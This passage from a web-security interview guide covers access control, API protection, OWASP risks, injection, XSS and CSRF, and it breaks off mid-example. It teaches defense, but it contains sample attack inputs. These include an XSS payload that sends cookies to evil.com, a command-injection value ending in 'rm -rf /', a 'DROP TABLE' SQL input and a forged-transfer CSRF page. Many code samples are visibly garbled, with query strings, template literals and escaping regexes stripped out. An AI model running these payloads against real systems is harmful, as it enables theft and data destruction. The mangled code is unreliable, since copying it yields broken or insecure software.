function evaluateAccess(user, resource, action, environment) {
  return policies.some(policy => {
    return matchConditions(policy.conditions, { user, resource, action, environment });
  });
}
`

## Key Points:
- Dynamic, attribute-based policies
- Considers user, resource, action, and environment attributes
- Enables fine-grained, context-aware authorization
- More flexible than RBAC but more complex
- Use when RBAC is too rigid

## Interview Tip:
Give a concrete ABAC example: users can only access their own department's data during business hours.

---

## Question: What is Permission-Based Access Control?

## Answer:
Permission-Based Access Control assigns specific permissions to users or roles, and checks those permissions before allowing actions.

`javascript
const permissions = {
  'posts:read': ['admin', 'editor', 'viewer'],
  'posts:write': ['admin', 'editor'],
  'posts:delete': ['admin'],
  'users:manage': ['admin']
};

function requirePermission(permission) {
  return (req, res, next) => {
    if (!permissions[permission]?.includes(req.user.role)) {
      return res.status(403).json({ error: 'Permission denied' });
    }
    next();
  };
}

app.get('/api/posts', requirePermission('posts:read'), getPosts);
app.delete('/api/posts/:id', requirePermission('posts:delete'), deletePost);
`

## Key Points:
- Explicit permission definitions per action
- Maps users/roles to specific permissions
- Granular control without ABAC complexity
- Easy to audit and understand

## Interview Tip:
Know the difference between permission-based and role-based.

---

## Question: What is the difference between roles and permissions?

## Answer:
Roles are collections of permissions assigned to users. Permissions are individual access rights for specific resources. A role groups related permissions, simplifying assignment and management.

`javascript
// Role: admin -> has permissions: read, write, delete, manage_users
// Role: editor -> has permissions: read, write

// Permission: posts:read -> granted to admin, editor, viewer
// Permission: posts:delete -> granted to admin only
`

## Key Points:
- Roles: collections of permissions (admin, editor, viewer)
- Permissions: individual access rights (read, write, delete)
- Roles simplify permission management
- One role can have many permissions
- One permission can be in many roles

## Interview Tip:
Use the hierarchy analogy: users -> roles -> permissions -> resources.

---

## Question: How do you design an RBAC system?

## Answer:
I design RBAC systems with a clear hierarchy: users are assigned to roles, roles have permissions, and permissions map to resources and actions. I use database tables for users, roles, permissions, and their mappings.

`javascript
// Database schema
// users: id, email, name
// roles: id, name, description
// permissions: id, name, resource, action
// user_roles: user_id, role_id
// role_permissions: role_id, permission_id

// Middleware
function requirePermission(resource, action) {
  return async (req, res, next) => {
    const userPermissions = await db.getUserPermissions(req.user.id);
    const hasPermission = userPermissions.some(p => 
      p.resource === resource && p.action === action
    );
    if (!hasPermission) {
      return res.status(403).json({ error: 'Permission denied' });
    }
    next();
  };
}

app.delete('/api/posts/:id', requirePermission('posts', 'delete'), deletePost);
`

## Key Points:
- Clear user -> role -> permission hierarchy
- Database tables for users, roles, permissions, mappings
- Permission-based middleware for route protection
- Support role hierarchy (admin inherits editor permissions)
- Audit trail for permission changes

## Interview Tip:
Draw the database schema on paper -- it shows practical design skills.

---

## Question: How do you implement authorization middleware?

## Answer:
I implement authorization middleware that checks user roles and permissions before allowing access to protected routes. The middleware runs after authentication and before the route handler.

`javascript
// Role-based middleware
function requireRole(...roles) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Not authenticated' });
    }
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  };
}

// Permission-based middleware
function requirePermission(permission) {
  return async (req, res, next) => {
    const userPermissions = await getUserPermissions(req.user.id);
    if (!userPermissions.includes(permission)) {
      return res.status(403).json({ error: 'Permission denied' });
    }
    next();
  };
}

// Usage
app.get('/admin/users', requireRole('admin'), getUsers);
app.delete('/posts/:id', requirePermission('posts:delete'), deletePost);
`

## Key Points:
- Middleware runs after authentication, before route handler
- Check roles or permissions based on requirements
- Return 401 for missing authentication, 403 for insufficient permissions
- Support both role-based and permission-based checks
- Cache permissions for performance

## Interview Tip:
Show how middleware composes: authenticate -> authorize -> handle request.

---

## Question: How do you handle resource-level permissions?

## Answer:
Resource-level permissions ensure users can only access resources they own or have been granted access to. I check ownership or permissions after authentication and before serving the resource.

`javascript
// Resource-level authorization
app.put('/api/posts/:id', authenticate, async (req, res) => {
  const post = await db.getPost(req.params.id);
  
  if (!post) {
    return res.status(404).json({ error: 'Post not found' });
  }
  
  // Check ownership or admin role
  if (post.authorId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Not your post' });
  }
  
  await db.updatePost(req.params.id, req.body);
  res.json({ success: true });
});

// Shared resource permissions
app.get('/api/documents/:id', authenticate, async (req, res) => {
  const doc = await db.getDocument(req.params.id);
  const hasAccess = await db.checkDocumentAccess(doc.id, req.user.id);
  
  if (!hasAccess) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  res.json({ document: doc });
});
`

## Key Points:
- Check ownership or explicit permissions
- Verify resource exists before authorization check
- Support shared resources with access control lists
- Return appropriate error messages
- Cache access checks for performance

## Interview Tip:
Give examples: user owns a post, user has shared access to a document.

---

## Question: What authorization best practices do you follow?

## Answer:
I follow several authorization best practices. I enforce authorization server-side always, apply the principle of least privilege, and implement defense in depth (multiple authorization layers). I use RBAC for simple systems and ABAC for fine-grained requirements.

`javascript
// Best practices implementation
// 1. Server-side enforcement
app.delete('/api/posts/:id', authenticate, async (req, res) => {
  const post = await db.getPost(req.params.id);
  if (post.authorId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  await db.deletePost(req.params.id);
  res.json({ success: true });
});

// 2. Defense in depth
app.use('/api/admin', authenticate, requireRole('admin'), adminRouter);

// 3. Audit logging
app.post('/api/sensitive-action', authenticate, async (req, res) => {
  await auditLog(req.user.id, 'sensitive_action', req.body);
  // ... perform action
});
`

## Key Points:
- Enforce authorization server-side always
- Apply principle of least privilege
- Implement defense in depth (multiple layers)
- Use RBAC for simple, ABAC for complex requirements
- Audit log all authorization decisions
- Cache permissions for performance

## Interview Tip:
Emphasize server-side enforcement -- client-side checks are UX improvements, not security.


---

# API Security (91-100)

## Question: How do you secure REST APIs?

## Answer:
I secure REST APIs using multiple layers: authentication (JWT/OAuth), authorization (RBAC/permissions), rate limiting, input validation, security headers, and HTTPS. Every API endpoint requires authentication except public routes, and authorization is checked on every request.

`javascript
// API security layers
app.use(helmet()); // Security headers
app.use(rateLimiter); // Rate limiting
app.use(authenticate); // Authentication
app.use('/api/admin', requireRole('admin')); // Authorization

// Input validation
app.post('/api/users', validateBody(userSchema), async (req, res) => {
  const user = await db.createUser(req.body);
  res.json({ user });
});
`

## Key Points:
- Authentication on every endpoint (except public)
- Authorization checked on every request
- Rate limiting to prevent abuse
- Input validation and sanitization
- Security headers (CSP, HSTS, etc.)
- HTTPS everywhere

## Interview Tip:
List the security layers from outermost to innermost.

---

## Question: What is API authentication?

## Answer:
API authentication verifies the identity of the API client. I use JWT tokens, OAuth 2.0, or API keys depending on the use case. JWT is my preferred method for user-facing APIs; API keys are for service-to-service communication.

`javascript
// JWT authentication middleware
function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
}

// API key authentication
function authenticateApiKey(req, res, next) {
  const apiKey = req.headers['x-api-key'];
  if (!apiKey || !isValidApiKey(apiKey)) {
    return res.status(401).json({ error: 'Invalid API key' });
  }
  next();
}
`

## Key Points:
- Verify identity of API client
- Methods: JWT, OAuth 2.0, API keys, mTLS
- JWT for user-facing APIs, API keys for service-to-service
- Validate token on every request
- Return 401 for authentication failures

## Interview Tip:
Know when to use each authentication method for APIs.

---

## Question: What is API authorization?

## Answer:
API authorization determines what authenticated clients can access. I implement authorization at the route level (middleware) and resource level (ownership checks).

`javascript
// Route-level authorization
app.delete('/api/posts/:id', authenticate, requireRole('admin'), deletePost);

// Resource-level authorization
app.put('/api/posts/:id', authenticate, async (req, res) => {
  const post = await db.getPost(req.params.id);
  if (post.authorId !== req.user.id) {
    return res.status(403).json({ error: 'Not your post' });
  }
  await db.updatePost(req.params.id, req.body);
});
`

## Key Points:
- Determine what authenticated clients can access
- Route-level (role-based) and resource-level (ownership) checks
- Enforce server-side always
- Return 403 for authorization failures
- Log authorization decisions for audit

## Interview Tip:
Distinguish authentication from authorization in API context.

---

## Question: What are API keys?

## Answer:
API keys are unique identifiers used to authenticate API clients. They're typically long, random strings sent in headers. I use API keys for service-to-service communication, not for user authentication.

`javascript
// API key validation
app.use('/api', (req, res, next) => {
  const apiKey = req.headers['x-api-key'];
  if (!apiKey || !await isValidApiKey(apiKey)) {
    return res.status(401).json({ error: 'Invalid API key' });
  }
  next();
});
`

## Key Points:
- Unique identifier for API clients
- Sent in headers (X-API-Key)
- Used for service-to-service, not user auth
- Less secure than JWT/OAuth for user auth
- Should be rotated regularly
- Never expose in URLs or client-side code

## Interview Tip:
Know when API keys are appropriate vs. when to use JWT/OAuth.

---

## Question: When should you use API keys?

## Answer:
I use API keys for server-to-server communication, third-party integrations, and rate limiting. They're simpler than OAuth but less secure for user-facing applications.

`javascript
// Appropriate: Service-to-service
const response = await fetch('https://api.partner.com/data', {
  headers: { 'X-API-Key': partnerApiKey }
});

// Not appropriate: User-facing APIs (use JWT/OAuth instead)
`

## Key Points:
- Service-to-server communication
- Third-party integrations
- Rate limiting and usage tracking
- Not for user authentication (use JWT/OAuth)
- Simpler but less secure than OAuth
- Rotate regularly

## Interview Tip:
Explain the security limitations of API keys for user auth.

---

## Question: What are bearer tokens?

## Answer:
Bearer tokens are tokens that grant access to the bearer (whoever holds them). In OAuth 2.0, access tokens are bearer tokens sent in the Authorization header. I implement bearer token validation on every protected API endpoint.

`javascript
// Bearer token validation
app.use('/api', (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing bearer token' });
  }
  
  const token = authHeader.split(' ')[1];
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
});
`

## Key Points:
- Token that grants access to the holder
- Sent in Authorization header: Bearer <token>
- Used in OAuth 2.0 for access tokens
- Must be validated on every request
- Should be transmitted over HTTPS only

## Interview Tip:
Explain why bearer tokens need HTTPS -- anyone with the token can use it.

---

## Question: How do you protect API endpoints?

## Answer:
I protect API endpoints with multiple layers: authentication, authorization, rate limiting, input validation, and error handling.

`javascript
// Protected endpoint
app.delete('/api/posts/:id',
  rateLimiter,           // Rate limiting
  authenticate,          // JWT verification
  requireRole('admin'),  // Role-based authorization
  async (req, res) => {
    try {
      const post = await db.getPost(req.params.id);
      if (!post) return res.status(404).json({ error: 'Not found' });
      await db.deletePost(req.params.id);
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: 'Internal server error' });
    }
  }
);
`

## Key Points:
- Authentication (verify identity)
- Authorization (check permissions)
- Rate limiting (prevent abuse)
- Input validation (prevent injection)
- Proper error handling (don't leak info)
- HTTPS (protect in transit)

## Interview Tip:
Show the layered defense approach on a single endpoint.

---

## Question: How do you prevent unauthorized API access?

## Answer:
I prevent unauthorized API access by requiring authentication on all endpoints except public ones, implementing rate limiting, validating tokens on every request, and monitoring for suspicious activity.

`javascript
// Default: require authentication
app.use('/api', authenticate);

// Public routes explicitly excluded
app.use('/api/public', publicRouter);

// Admin routes require specific role
app.use('/api/admin', authenticate, requireRole('admin'));

// Monitor for anomalies
app.use((req, res, next) => {
  if (req.user && req.user.role === 'admin' && !isTrustedIP(req.ip)) {
    alertSecurityTeam(req.user, req.ip);
  }
  next();
});
`

## Key Points:
- Require authentication by default
- Explicitly exclude public routes
- Rate limit all endpoints
- Validate tokens on every request
- Monitor for suspicious activity
- Alert on anomalies

## Interview Tip:
Default-deny approach -- require auth by default, exclude public routes.

---

## Question: What API security headers do you know?

## Answer:
I use HTTP security headers to protect APIs and web applications. Key headers include Content-Security-Policy, Strict-Transport-Security, X-Content-Type-Options, X-Frame-Options, and X-XSS-Protection.

`javascript
const helmet = require('helmet');

app.use(helmet());
// Sets: CSP, HSTS, X-Content-Type-Options, X-Frame-Options, etc.

// Custom headers
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  next();
});
`

## Key Points:
- Content-Security-Policy: Prevents XSS
- Strict-Transport-Security: Forces HTTPS
- X-Content-Type-Options: Prevents MIME sniffing
- X-Frame-Options: Prevents clickjacking
- Cache-Control: Prevents sensitive data caching

## Interview Tip:
Know the most important security headers and what they protect against.

---

## Question: What API security practices do you follow in production?

## Answer:
In production, I follow comprehensive API security practices: HTTPS everywhere, JWT with short expiration, rate limiting, input validation, security headers, audit logging, and regular security audits.

`javascript
// Production security configuration
app.use(helmet());
app.use(rateLimiter);
app.use(authenticate);
app.use(validateInput);

// Audit logging
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    logAudit(req.user?.id, req.method, req.url, res.statusCode, Date.now() - start);
  });
  next();
});

// Error handling (don't leak internals)
app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: 'Internal server error' });
});
`

## Key Points:
- HTTPS everywhere
- JWT with short expiration
- Rate limiting on all endpoints
- Input validation and sanitization
- Security headers (CSP, HSTS, etc.)
- Audit logging for all API operations
- Regular security audits

## Interview Tip:
Mention production-specific concerns: logging, monitoring, alerting.


---

# OWASP & Common Attacks (101-110)

## Question: What is OWASP?

## Answer:
OWASP (Open Worldwide Application Security Project) is a nonprofit foundation that works to improve software security. It provides free resources, tools, and standards like the OWASP Top 10 that help developers build secure applications. I reference OWASP guidelines when designing security architecture and conducting security reviews.

## Key Points:
- Nonprofit foundation for application security
- Provides free tools, guides, and standards
- OWASP Top 10 is the most well-known resource
- Community-driven security best practices
- Used globally by developers and security professionals

## Interview Tip:
Reference OWASP guidelines in your answers -- it shows you follow industry standards.

---

## Question: What is OWASP Top 10?

## Answer:
The OWASP Top 10 is a standard awareness document listing the most critical web application security risks. It's updated regularly based on real-world data and expert consensus. The current list includes Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable Components, Authentication Failures, Data Integrity Failures, Logging Failures, and Server-Side Request Forgery.

## Key Points:
- Standard awareness document for web security risks
- Updated regularly based on real-world data
- Broken Access Control is consistently #1
- Informs security priorities and training
- Should be referenced in security discussions

## Interview Tip:
Know the current OWASP Top 10 and be able to discuss mitigation strategies.

---

## Question: Why should developers understand OWASP risks?

## Answer:
Understanding OWASP risks helps developers build secure applications from the start rather than retrofitting security later. I use OWASP as a checklist during code reviews and security assessments.

## Key Points:
- Security is cheaper when built-in from the start
- Helps prioritize security efforts
- Enables informed architectural decisions
- Improves code review effectiveness
- Reduces vulnerability exposure

## Interview Tip:
Connect OWASP knowledge to practical development activities like code reviews.

---

## Question: What is injection attack?

## Answer:
Injection attacks occur when untrusted data is sent to an interpreter as part of a command or query. The attacker exploits insufficient input validation to inject malicious code that the interpreter executes. Common types include SQL injection, NoSQL injection, command injection, and LDAP injection.

`javascript
// Vulnerable to SQL injection
const query = SELECT * FROM users WHERE id = '';
// If userId is 1' OR '1'='1, returns all users

// Protected with parameterized queries
const query = 'SELECT * FROM users WHERE id = ';
const result = await db.query(query, [userId]);
`

## Key Points:
- Untrusted data sent to interpreter as code
- Types: SQL, NoSQL, command, LDAP injection
- Prevented by parameterized queries and input validation
- OWASP Top 10 consistently includes injection
- Never concatenate user input into queries

## Interview Tip:
Show both vulnerable and secure examples -- it demonstrates practical understanding.

---

## Question: What is SQL Injection?

## Answer:
SQL Injection occurs when user input is concatenated directly into SQL queries, allowing attackers to modify the query logic. I prevent it by using parameterized queries (prepared statements) and ORM frameworks that handle escaping automatically.

`javascript
// VULNERABLE
const query = SELECT * FROM users WHERE email = '';
// Attack: email = ' OR '1'='1' --

// SECURE: Parameterized query
const query = 'SELECT * FROM users WHERE email = ';
const result = await db.query(query, [email]);

// SECURE: ORM (Prisma)
const user = await prisma.user.findUnique({ where: { email } });
`

## Key Points:
- User input concatenated into SQL queries
- Attackers can modify query logic
- Prevented by parameterized queries
- Use ORM frameworks for automatic protection
- Never concatenate user input into SQL
- Can lead to data theft, modification, or deletion

## Interview Tip:
Show the vulnerable vs. secure code -- it's the most effective demonstration.

---

## Question: How does SQL Injection happen?

## Answer:
SQL injection happens when user input is concatenated into SQL queries without proper sanitization or parameterization. The attacker provides specially crafted input that modifies the query structure.

`javascript
// How it happens:
// User input: 1' OR '1'='1
// Query becomes: SELECT * FROM users WHERE id = '1' OR '1'='1'
// 'OR '1'='1' is always true, returns all users

// Even more dangerous:
// User input: '; DROP TABLE users; --
// Query becomes: SELECT * FROM users WHERE id = ''; DROP TABLE users; --'
`

## Key Points:
- User input concatenated into SQL queries
- Input contains SQL syntax that modifies query logic
- Can extract, modify, or delete data
- Can execute administrative operations
- Prevention: parameterized queries, input validation

## Interview Tip:
Walk through the attack step-by-step -- it shows deep understanding.

---

## Question: How do you prevent SQL Injection?

## Answer:
I prevent SQL injection using parameterized queries, ORM frameworks, input validation, and least privilege database permissions. Parameterized queries ensure user input is treated as data, not executable code.

`javascript
// 1. Parameterized queries
const query = 'SELECT * FROM users WHERE id = ';
await db.query(query, [userId]);

// 2. ORM (Prisma)
const user = await prisma.user.findUnique({ where: { id: userId } });

// 3. Input validation
const userId = parseInt(req.params.id);
if (isNaN(userId)) return res.status(400).json({ error: 'Invalid ID' });

// 4. Least privilege
// Database user should only have necessary permissions
`

## Key Points:
- Parameterized queries (prepared statements)
- Use ORM frameworks (Prisma, Sequelize)
- Input validation and sanitization
- Least privilege database permissions
- Never concatenate user input into SQL
- Regular security audits

## Interview Tip:
List multiple prevention methods -- it shows defense-in-depth thinking.

---

## Question: What is NoSQL Injection?

## Answer:
NoSQL injection targets NoSQL databases (MongoDB, CouchDB) when user input is used in queries without proper validation. Unlike SQL injection, it exploits the query language of the specific database.

`javascript
// VULNERABLE (MongoDB)
const user = await User.findOne({ email: req.body.email });
// Attack: email = { ":  } -- returns all users

// SECURE: Input validation
const email = req.body.email;
if (typeof email !== 'string' || !email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
 return res.status(400).json({ error: 'Invalid email' });
}
const user = await User.findOne({ email });

// SECURE: Use mongoose schema validation
const userSchema = new mongoose.Schema({
 email: { type: String, required: true, match: /^[^\s@]+@[^\s@]+\.[^\s@]+$/ }
});
`

## Key Points:
- Targets NoSQL databases (MongoDB, CouchDB)
- Exploits query language of specific database
- Prevented by input validation and type checking
- Use schema validation (Mongoose)
- Never pass unsanitized user input to queries

## Interview Tip:
Know the difference between SQL and NoSQL injection vectors.

---

## Question: How do you prevent NoSQL Injection?

## Answer:
I prevent NoSQL injection by validating input types, using schema validation, and sanitizing user input before queries.

`javascript
// 1. Input type validation
if (typeof req.body.email !== 'string') {
 return res.status(400).json({ error: 'Invalid input' });
}

// 2. Schema validation (Mongoose)
const userSchema = new mongoose.Schema({
 email: { type: String, required: true, match: emailRegex },
 age: { type: Number, min: 0, max: 150 }
});

// 3. Sanitize input
const sanitize = require('mongo-sanitize');
const cleanEmail = sanitize(req.body.email);

// 4. Query safely
const user = await User.findOne({ email: cleanEmail });
`

## Key Points:
- Validate input types (string, number, etc.)
- Use schema validation (Mongoose)
- Sanitize input before queries
- Never pass raw user input to queries
- Usemongo-sanitize library
- Regular security audits

## Interview Tip:
Mention the mongo-sanitize library -- it's a practical tool for MongoDB.

---

## Question: What is Command Injection?

## Answer:
Command injection occurs when user input is passed to system commands without proper sanitization. Attackers can execute arbitrary commands on the server.

`javascript
// VULNERABLE
const { exec } = require('child_process');
exec(ping );
// Attack: host = 8.8.8.8; rm -rf /

// SECURE: Use spawn with array
const { spawn } = require('child_process');
spawn('ping', ['-c', '4', req.body.host]);

// SECURE: Input validation
const host = req.body.host;
if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
 return res.status(400).json({ error: 'Invalid host' });
}
`

## Key Points:
- User input passed to system commands
- Can execute arbitrary commands on server
- Prevented by input validation and safe APIs
- Use spawn with array instead of exec with string
- Never use exec with user input
- Can lead to complete server compromise

## Interview Tip:
Emphasize that exec with user input is always dangerous.


---

# Cross-Site Scripting (XSS) (111-120)

## Question: What is XSS?

## Answer:
Cross-Site Scripting (XSS) is a vulnerability where attackers inject malicious scripts into web pages viewed by other users. XSS allows attackers to execute JavaScript in the victim's browser, enabling session hijacking, credential theft, and defacement.

I prevent XSS using output encoding, Content Security Policy, input sanitization, and framework-provided escaping.

`javascript
// Vulnerable: Unescaped output
res.send(<div></div>);
// Attack: userInput = <script>document.location='http://evil.com?c='+document.cookie</script>

// Secure: Output encoding
const sanitizeHtml = require('sanitize-html');
res.send(<div></div>);
`

## Key Points:
- Injection of malicious scripts into web pages
- Executes in victim's browser
- Can steal sessions, credentials, and data
- Prevented by output encoding, CSP, input sanitization
- OWASP Top 10 vulnerability

## Interview Tip:
Explain the impact of XSS -- it's not just annoying, it can compromise user accounts.

---

## Question: What are the different types of XSS attacks?

## Answer:
There are three types of XSS: Stored XSS (malicious script stored on the server), Reflected XSS (script reflected in URL/response), and DOM-based XSS (script executes in client-side DOM).

`javascript
// Stored XSS: Malicious script stored in database
// User posts comment with <script>steal cookies()</script>
// Every user viewing the comment executes the script

// Reflected XSS: Script reflected in URL/response
// URL: https://example.com/search?q=<script>steal()</script>
// Server reflects q parameter in response

// DOM-based XSS: Script executes in client-side DOM
// document.getElementById('output').innerHTML = location.hash.slice(1);
`

## Key Points:
- Stored: Script persisted on server (most dangerous)
- Reflected: Script reflected in URL/response
- DOM-based: Script executes in client-side DOM
- All preventable with proper encoding and sanitization

## Interview Tip:
Know the difference between stored, reflected, and DOM-based XSS.

---

## Question: What is Stored XSS?

## Answer:
Stored XSS occurs when malicious script is permanently stored on the target server (database, message forum, comment field). Every user who views the affected page executes the script.

`javascript
// Vulnerable: Storing unescaped user input
await db.saveComment({ text: req.body.comment });
// comment contains: <script>stealCookies()</script>

// Secure: Sanitize before storing
const cleanComment = sanitizeHtml(req.body.comment, { allowedTags: [] });
await db.saveComment({ text: cleanComment });
`

## Key Points:
- Malicious script stored on server
- Affects all users who view the content
- Most dangerous XSS type
- Prevented by sanitizing input before storage
- Output encoding when displaying

## Interview Tip:
Stored XSS is the most severe -- it affects every user who views the content.

---

## Question: What is Reflected XSS?

## Answer:
Reflected XSS occurs when user input is reflected in the server's response without proper encoding. The attacker sends a malicious link to the victim, who clicks it and executes the script.

`javascript
// Vulnerable: Reflecting user input in response
res.send(<p>Search results for: </p>);
// Attack: /search?q=<script>steal()</script>

// Secure: Encode output
res.send(<p>Search results for: </p>);
`

## Key Points:
- User input reflected in server response
- Requires victim to click malicious link
- Script executes once per click
- Prevented by output encoding
- Less severe than stored XSS

## Interview Tip:
Explain that reflected XSS requires social engineering (tricking user to click link).

---

## Question: What is DOM-based XSS?

## Answer:
DOM-based XSS occurs when the vulnerability exists in client-side JavaScript rather than server-side code. The attacker manipulates the DOM environment to execute malicious scripts.

`javascript
// Vulnerable: Client-side DOM manipulation
document.getElementById('output').innerHTML = location.hash.slice(1);
// URL: https://example.com/page#<img src=x onerror=steal()>

// Secure: Use textContent instead of innerHTML
document.getElementById('output').textContent = location.hash.slice(1);
`

## Key Points:
- Vulnerability in client-side JavaScript
- Server may not see the attack payload
- Prevented by avoiding innerHTML with user input
- Use textContent or proper encoding
- Difficult to detect with server-side scanning

## Interview Tip:
DOM-based XSS is often missed by server-side security tools.

---

## Question: How does XSS affect users?

## Answer:
XSS can steal session cookies, redirect users to malicious sites, deface websites, perform actions on behalf of users, and steal credentials. The impact ranges from annoying to catastrophic depending on the application.

## Key Points:
- Session hijacking (cookie theft)
- Credential theft
- Website defacement
- Malware distribution
- Phishing attacks
- Data theft

## Interview Tip:
Give specific examples of XSS impact -- it shows you understand the severity.

---

## Question: How do you prevent XSS attacks?

## Answer:
I prevent XSS using multiple layers: output encoding, Content Security Policy, input sanitization, using frameworks that auto-escape, and avoiding dangerous DOM methods.

`javascript
// 1. Output encoding
const escapeHtml = (str) => str.replace(/[&<>']/g, (m) => ({
 '&': '&amp;', '<': '&lt;', '>': '&gt;', '': '&quot;', ': '&#39;'
})[m]);

// 2. CSP header
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ['self'],
    scriptSrc: ['self'],
    styleSrc: ['self', 'unsafe-inline']
  }
}));

// 3. Input sanitization
const sanitizeHtml = require('sanitize-html');
const clean = sanitizeHtml(userInput, { allowedTags: [] });

// 4. Safe DOM methods
element.textContent = userInput; // Safe
// element.innerHTML = userInput; // DANGEROUS
`

## Key Points:
- Output encoding (HTML, JavaScript, URL, CSS)
- Content Security Policy (CSP)
- Input sanitization
- Use frameworks with auto-escaping
- Avoid innerHTML with user input
- Use textContent instead

## Interview Tip:
Show multiple prevention methods -- defense in depth is key.

---

## Question: What is output encoding?

## Answer:
Output encoding converts special characters into their HTML entity equivalents, preventing them from being interpreted as code. I encode output based on context: HTML, JavaScript, URL, or CSS.

`javascript
// HTML encoding
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(//g, '&quot;')
 .replace(/'/g, '&#39;');
}

// Usage
res.send(<div></div>);
// userInput: <script>alert('xss')</script>
// Becomes: &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;
`

## Key Points:
- Converts special characters to HTML entities
- Prevents code execution in browser
- Context-dependent (HTML, JS, URL, CSS)
- Primary defense against XSS
- Must be applied at output, not input

## Interview Tip:
Know the different encoding contexts -- HTML, JavaScript, URL, CSS.

---

## Question: What is input sanitization?

## Answer:
Input sanitization removes or escapes potentially dangerous characters from user input. I use libraries like sanitize-html for HTML content and alidator for general sanitization.

`javascript
// Using sanitize-html
const sanitizeHtml = require('sanitize-html');
const clean = sanitizeHtml(userInput, {
 allowedTags: ['b', 'i', 'em', 'strong'],
 allowedAttributes: {}
});

// Using validator
const { sanitize } = require('validator');
const cleanEmail = sanitize(req.body.email).trim().normalizeEmail();
`

## Key Points:
- Removes or escapes dangerous characters
- Use established libraries (sanitize-html, validator)
- Sanitize based on expected content type
- Not a complete XSS prevention (combine with encoding)
- Sanitize on input, encode on output

## Interview Tip:
Sanitization complements encoding -- both are needed.

---

## Question: What security practices prevent XSS?

## Answer:
I follow comprehensive XSS prevention practices: use frameworks with auto-escaping, implement CSP, sanitize input, encode output, avoid innerHTML, use httpOnly cookies, and regularly audit code.

`javascript
// Framework auto-escaping (React)
// JSX automatically encodes output
function Comment({ text }) {
 return <div>{text}</div>; // Safe: text is encoded
 // return <div dangerouslySetInnerHTML={{__html: text}} />; // DANGEROUS
}

// CSP
app.use(helmet.contentSecurityPolicy({
 directives: { scriptSrc: ['self'] }
}));

// httpOnly cookies (prevent session theft)
res.cookie('session', token, { httpOnly: true, secure: true });
`

## Key Points:
- Use frameworks with auto-escaping (React, Vue)
- Implement Content Security Policy
- Sanitize input, encode output
- Avoid innerHTML and dangerouslySetInnerHTML
- Use httpOnly cookies for session tokens
- Regular security audits

## Interview Tip:
Mention React's auto-escaping and dangerouslySetInnerHTML.


---

# Cross-Site Request Forgery (CSRF) (121-130)

## Question: What is CSRF?

## Answer:
CSRF (Cross-Site Request Forgery) is an attack that tricks authenticated users into submitting unintended requests. The attacker crafts a malicious page that automatically sends requests to your application, using the user's existing session cookies.

`javascript
// Vulnerable: No CSRF protection
app.post('/api/transfer', (req, res) => {
  // No CSRF token validation
  transferMoney(req.user.id, req.body.to, req.body.amount);
});

// Secure: CSRF token validation
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

app.post('/api/transfer', (req, res) => {
  // CSRF token validated by middleware
  transferMoney(req.user.id, req.body.to, req.body.amount);
});
`

## Key Points:
- Tricked authenticated users into submitting requests
- Exploits automatic cookie sending
- Can transfer money, change settings, etc.
- Prevented by CSRF tokens and SameSite cookies
- OWASP Top 10 vulnerability

## Interview Tip:
Explain the attack scenario -- it makes the concept clear.

---

## Question: How does a CSRF attack work?

## Answer:
CSRF works because browsers automatically send cookies with requests. If a user is logged into your site and visits an attacker's page, that page can send requests to your site, and the browser includes the user's cookies.

`html
<!-- Attacker's page -->
<img src=https://yourbank.com/transfer?to=attacker&amount=10000 />
<!-- or -->
<form action=https://yourbank.com/transfer method=POST>
  <input type=hidden name=to value=attacker />
  <input type=hidden name=amount value=10000 />
  <input type=submit />
</form>
<script>document.forms[0].submit();</script>
`

## Key Points:
- Browser sends cookies automatically
- Attacker crafts malicious request
- User's session authenticates the request
- User may not even know the request was sent
- Can affect any action the user can perform

## Interview Tip:
Show the HTML example -- it makes the attack concrete.

---

## Question: Why are cookies vulnerable to CSRF?

## Answer:
Cookies are vulnerable because browsers automatically include them in every request to the domain that set them. This is by design for convenience but creates a security risk. Even with httpOnly and secure attributes, cookies are still sent automatically.

`javascript
// Cookie is sent automatically
// Even if attacker's page initiates the request
fetch('https://yourbank.com/transfer', {
  method: 'POST',
  credentials: 'include' // Cookies included
});
`

## Key Points:
- Browsers send cookies automatically with every request
- httpOnly prevents JavaScript access but not automatic sending
- secure attribute only prevents HTTP transmission
- SameSite attribute provides CSRF protection
- This is why SameSite is critical for security

## Interview Tip:
Explain that httpOnly protects against XSS but not CSRF.

---

## Question: How do you prevent CSRF attacks?

## Answer:
I prevent CSRF using multiple methods: CSRF tokens, SameSite cookies, checking Origin/Referer headers, and requiring re-authentication for sensitive actions.

`javascript
// 1. CSRF tokens
const csrf = require('csurf');
app.use(csrf({ cookie: { httpOnly: true, secure: true, sameSite: 'strict' } }));

// Include token in forms
app.get('/form', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// 2. SameSite cookies
res.cookie('session', token, { sameSite: 'strict', httpOnly: true, secure: true });

// 3. Origin/Referer check
app.use((req, res, next) => {
